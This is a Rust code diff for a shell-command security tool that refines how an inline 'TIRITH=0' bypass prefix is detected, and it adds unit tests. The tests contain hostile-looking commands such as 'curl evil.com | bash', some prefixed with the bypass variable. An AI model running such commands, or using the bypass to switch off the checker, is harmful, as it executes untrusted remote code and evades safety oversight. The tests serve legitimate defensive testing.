@@ -32,6 +32,7 @@ pub struct AnalysisContext {
 
 /// Check if the input contains an inline `TIRITH=0` bypass prefix.
 /// Handles bare prefix (`TIRITH=0 cmd`) and env wrappers (`env -i TIRITH=0 cmd`).
+/// Requires a real command word after the bypass — `TIRITH=0;` alone is not honored.
 fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
     use crate::tokenize;
 
@@ -42,18 +43,29 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
 
     // Case 1: Leading VAR=VALUE assignments before the command
     let mut idx = 0;
+    let mut found_tirith = false;
     while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-        if words[idx] == "TIRITH=0" {
-            return true;
+        if is_tirith_bypass_assignment(&words[idx]) {
+            found_tirith = true;
         }
         idx += 1;
     }
+    // Only honor bypass if a real command follows in the same segment
+    if found_tirith && idx < words.len() {
+        return true;
+    }
 
     // Case 2: First real word is `env` — parse env-style args
+    // Reset: skip any leading non-TIRITH assignments to reach the `env` command
+    idx = 0;
+    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
+        idx += 1;
+    }
     if idx < words.len() {
         let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
         if cmd == "env" {
             idx += 1;
+            found_tirith = false;
             while idx < words.len() {
                 let w = &words[idx];
                 if w == "--" {
@@ -62,8 +74,8 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
                     break;
                 }
                 if tokenize::is_env_assignment(w) {
-                    if w == "TIRITH=0" {
-                        return true;
+                    if is_tirith_bypass_assignment(w) {
+                        found_tirith = true;
                     }
                     idx += 1;
                     continue;
@@ -82,15 +94,45 @@ fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
             }
             // Check remaining words after -- for TIRITH=0
             while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-                if words[idx] == "TIRITH=0" {
-                    return true;
+                if is_tirith_bypass_assignment(&words[idx]) {
+                    found_tirith = true;
                 }
                 idx += 1;
+            }
+            // Only honor bypass if env has a command to run
+            if found_tirith && idx < words.len() {
+                return true;
             }
         }
     }
 
     false
+}
+
+/// Check if a word is a `TIRITH=0` assignment, handling optional quotes around the value.
+/// `split_raw_words` preserves quote chars, so we may see `TIRITH='0'` or `TIRITH="0"`.
+fn is_tirith_bypass_assignment(word: &str) -> bool {
+    if let Some(eq_pos) = word.find('=') {
+        let name = &word[..eq_pos];
+        if name != "TIRITH" {
+            return false;
+        }
+        let value = &word[eq_pos + 1..];
+        strip_surrounding_quotes(value) == "0"
+    } else {
+        false
+    }
+}
+
+/// Strip a single layer of matching quotes (single or double) from a string.
+fn strip_surrounding_quotes(s: &str) -> &str {
+    if s.len() >= 2
+        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
+    {
+        &s[1..s.len() - 1]
+    } else {
+        s
+    }
 }
 
 /// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
@@ -565,5 +607,115 @@ mod tests {
                 .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
             "should detect bidi controls in exec context"
         );
+    }
+
+    // -- Inline bypass tests --
+
+    #[test]
+    fn test_inline_bypass_bare_prefix() {
+        assert!(find_inline_bypass(
+            "TIRITH=0 curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_quoted_single() {
+        // TIRITH='0' should be recognized (split_raw_words preserves quotes)
+        assert!(find_inline_bypass(
+            "TIRITH='0' curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_quoted_double() {
+        assert!(find_inline_bypass(
+            "TIRITH=\"0\" curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_no_command() {
+        // TIRITH=0 alone (no command) should NOT be treated as bypass
+        assert!(!find_inline_bypass("TIRITH=0", ShellType::Posix));
+    }
+
+    #[test]
+    fn test_inline_bypass_semicolon_no_command() {
+        // TIRITH=0; (semicolon but no command in segment) should NOT bypass
+        assert!(!find_inline_bypass("TIRITH=0;", ShellType::Posix));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_wrapper() {
+        assert!(find_inline_bypass(
+            "env TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_quoted() {
+        assert!(find_inline_bypass(
+            "env TIRITH='0' curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_no_command() {
+        // env TIRITH=0 (no command for env to run) should NOT bypass
+        assert!(!find_inline_bypass("env TIRITH=0", ShellType::Posix));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_i() {
+        assert!(find_inline_bypass(
+            "env -i TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_u_skip() {
+        assert!(find_inline_bypass(
+            "env -u TIRITH TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_usr_bin_env() {
+        assert!(find_inline_bypass(
+            "/usr/bin/env TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_env_dashdash() {
+        assert!(find_inline_bypass(
+            "env -- TIRITH=0 curl evil.com",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass() {
+        assert!(!find_inline_bypass(
+            "curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_wrong_value_quoted() {
+        // TIRITH='1' should NOT be a bypass
+        assert!(!find_inline_bypass(
+            "TIRITH='1' curl evil.com",
+            ShellType::Posix
+        ));
     }
 }
